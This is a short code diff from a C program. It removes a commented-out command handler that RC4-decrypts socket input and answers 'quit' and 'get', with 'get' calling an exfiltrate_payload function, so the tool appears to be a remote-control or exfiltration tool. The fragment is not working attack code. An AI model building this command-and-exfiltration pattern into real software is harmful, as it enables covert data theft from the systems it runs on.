@@ -132,25 +132,7 @@ int main(int argc, char **argv){
                 default:
                     break;
             }
-            // // rc4((unsigned char *)key, strlen(key), BUF, strlen(BUF));
-            // if (i == -1 || i == 0){
-            //     send(afd, "c\0", 2, 0);
-            //     continue;
-            // }
-            // puts(BUF); 
-            // printf("%d\n",i);
-            // if (strcmp("quit", BUF) == 0){
-            //     send(afd, "aa\0", 3, 0);
-            //     close(afd);
-            //     break;
-            // }
-            // else if (strcmp("get", BUF) == 0){
-            //     send(afd, "bb\0", 3, 0);
-            //     exfiltrate_payload(afd);
-            //     continue;
-            // }
 
-            // send(afd, "c\0", 2, 0);
         }
     }
     
